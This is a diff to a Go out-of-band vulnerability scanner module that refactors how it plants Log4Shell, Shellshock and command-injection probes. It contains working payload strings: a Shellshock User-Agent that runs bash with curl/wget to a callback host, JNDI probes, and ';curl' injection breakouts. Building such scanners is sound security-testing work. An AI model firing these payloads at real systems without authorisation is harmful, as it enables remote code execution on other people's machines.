@@ -41,25 +41,15 @@ func NewOASTScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, l
 var oastClient = newPooledClient(12*time.Second, false)
 
 func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
-	base := strings.TrimRight(s.cfg.BlindXSSCallbackURL, "/")
-	if base == "" {
-		logFn("warn", "oast", "Blind SSRF/RCE skipped — no callback URL configured (set blind_xss_callback_url to this app's public URL).")
+	oob, ok := newOOBCapability(s.cfg)
+	if !ok {
+		logFn("warn", "oast", "Log4Shell/Shellshock OAST skipped — no callback URL configured (set blind_xss_callback_url to this app's public URL).")
 		return nil
-	}
-	// The value injected must be a bare host[:port] for some contexts and a full
-	// URL for others; derive both from the configured public URL.
-	callbackHost := stripScheme(base)
-	// For JNDI/Log4Shell the target's LDAP client connects to the raw OOB listener
-	// (host without the HTTP port) on OOBRawPort (canonical 1389 when unset).
-	oobHost := oobHostOnly(base)
-	rawPort := s.cfg.OOBRawPort
-	if rawPort <= 0 {
-		rawPort = 1389
 	}
 
 	points := loadInsertionPoints(ctx, s.db, targetID, s.cfg.URLLimit())
 	auth := loadAuthHeaders(ctx, s.db, targetID)
-	logFn("info", "oast", fmt.Sprintf("Planting out-of-band SSTI/Log4Shell probes across %d insertion points...", len(points)))
+	logFn("info", "oast", fmt.Sprintf("Planting out-of-band Log4Shell probes across %d insertion points...", len(points)))
 
 	sem := make(chan struct{}, 12)
 	var wg sync.WaitGroup
@@ -70,38 +60,21 @@ func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 			break
 		}
 
-		// NOTE: blind SSRF, RCE and SQLi are no longer planted here. Each objective
+		// NOTE: blind SSRF, RCE, SQLi and SSTI are no longer planted here. Each objective
 		// now OWNS its own out-of-band confirmation via the shared oobCapability:
 		// blind SSRF in SSRFScanner.plantBlindSSRF, blind RCE in
 		// CmdiScanner.plantBlindRCE, blind SQLi in SQLiScanner.plantBlindSQLi, blind
-		// XXE in XXEScanner. That keeps a single-objective scan (e.g. SQLi-only) from
+		// SSTI in SSTIScanner.plantBlindSSTI, and blind XXE in XXEScanner. That keeps a single-objective scan (e.g. SQLi-only) from
 		// planting — and therefore emitting findings for — unrelated vulnerability
-		// classes. This module retains the classes without a dedicated home below
-		// (blind SSTI, Log4Shell).
-
-		// ── Blind SSTI ── template-engine payloads that RUN a command fetching our
-		// host. Catches SSTI whose evaluated output is never rendered back (the
-		// in-band {{7*7}} check can't), across Jinja2/Mako/Twig/Smarty/Nunjucks/
-		// ERB/Freemarker/SpEL. Same token across engines.
-		etoken := s.newProbe(targetID, ip.URL, ip.Param, "ssti", "param:"+ip.Param)
-		planted++
-		ecb := "http://" + callbackHost + "/oob/" + etoken
-		for _, v := range sstiOOBPayloads(ecb) {
-			wg.Add(1)
-			sem <- struct{}{}
-			go func(ip insertionPoint, v string) {
-				defer wg.Done()
-				defer func() { <-sem }()
-				sendInjected(ctx, oastClient, ip, v, auth)
-			}(ip, v)
-		}
+		// classes. This generic module now retains only Log4Shell parameter/header
+		// coverage, whose raw LDAP listener is infrastructure-specific.
 
 		// ── Blind Log4Shell ── JNDI into web PARAMETERS (the original dominant
 		// exploitation vector; the network engine only sprays it through headers).
 		// A callback lands on the raw LDAP/RMI listener, correlated by token.
 		ltoken := s.newProbe(targetID, ip.URL, ip.Param, "log4shell", "param:"+ip.Param)
 		planted++
-		lcb := fmt.Sprintf("%s:%d/%s", oobHost, rawPort, ltoken)
+		lcb := fmt.Sprintf("%s:%d/%s", oob.oobHost, oob.rawPort, ltoken)
 		for _, v := range log4ShellParamPayloads(lcb) {
 			wg.Add(1)
 			sem <- struct{}{}
@@ -113,24 +86,24 @@ func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 		}
 	}
 
-	// ── Header sinks ── SSRF via proxy-style headers, RCE via Shellshock in
-	// User-Agent, and Log4Shell across the Log4j header sinks — one pair of
-	// requests per alive host root. Each vector has its OWN token so a callback
-	// attributes to the right class.
+	// ── Header sinks ── RCE via Shellshock in User-Agent and Log4Shell across
+	// the Log4j header sinks. SSRF header coverage is owned by SSRFScanner so an
+	// SSRF-only objective remains complete and this generic pass cannot duplicate
+	// those probes.
 	roots := s.aliveRoots(ctx, targetID)
 	for _, root := range roots {
 		if ctx.Err() != nil {
 			break
 		}
-		token := s.newProbe(targetID, root, "", "ssrf", "headers")
+		rceToken := s.newProbe(targetID, root, "User-Agent", "rce", "header:shellshock")
 		planted++
-		cb := "http://" + callbackHost + "/oob/" + token
+		rceCB := oob.callbackURL(rceToken)
 		l4token := s.newProbe(targetID, root, "", "log4shell", "headers")
 		planted++
-		l4cb := fmt.Sprintf("%s:%d/%s", oobHost, rawPort, l4token)
+		l4cb := fmt.Sprintf("%s:%d/%s", oob.oobHost, oob.rawPort, l4token)
 		wg.Add(1)
 		sem <- struct{}{}
-		go func(root, cb, l4cb string) {
+		go func(root, rceCB, l4cb string) {
 			defer wg.Done()
 			defer func() { <-sem }()
 			reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
@@ -139,13 +112,9 @@ func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 			if err != nil {
 				return
 			}
-			// SSRF via routing headers.
-			req.Header.Set("X-Forwarded-Host", stripScheme(cb))
-			req.Header.Set("X-Forwarded-For", stripScheme(cb))
-			req.Header.Set("Referer", cb)
-			req.Header.Set("True-Client-IP", stripScheme(cb))
-			// Shellshock RCE via User-Agent (CVE-2014-6271).
-			req.Header.Set("User-Agent", "() { :;}; /bin/bash -c 'curl -s "+cb+" || wget -q -O- "+cb+"'")
+			// Shellshock RCE uses a separate token from the SSRF headers. Sharing
+			// one token used to mislabel a shell callback as blind_ssrf.
+			req.Header.Set("User-Agent", "() { :;}; /bin/bash -c 'curl -s "+rceCB+" || wget -q -O- "+rceCB+"'")
 			for k, v := range auth {
 				req.Header.Set(k, v)
 			}
@@ -168,18 +137,24 @@ func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 			if resp, e := oastClient.Do(l4req); e == nil {
 				resp.Body.Close()
 			}
-		}(root, cb, l4cb)
+		}(root, rceCB, l4cb)
 	}
 
 	wg.Wait()
-	logFn("info", "oast", fmt.Sprintf("OAST done. %d blind SSTI/Log4Shell probe(s) planted; execution reported via callback.", planted))
+	logFn("info", "oast", fmt.Sprintf("OAST done. %d Log4Shell/header probe(s) planted; execution reported via callback.", planted))
 	return nil
 }
 
 // rceOOBPayloads wraps an HTTP callback in the common command-injection breakouts
 // (Unix and Windows). fetch helpers curl/wget cover Linux; certutil covers Windows.
 func rceOOBPayloads(cb string) []string {
-	host := stripScheme(cb)
+	// nslookup accepts a host, not an HTTP path. Passing the historical
+	// "host/oob/token" string made the DNS-only Windows fallback syntactically
+	// invalid and silently lost blind command-injection callbacks.
+	host := oobHostOnly(cb)
+	if host == "" {
+		host = stripScheme(cb)
+	}
 	return []string{
 		";curl -s " + cb + ";",
 		"|curl -s " + cb,
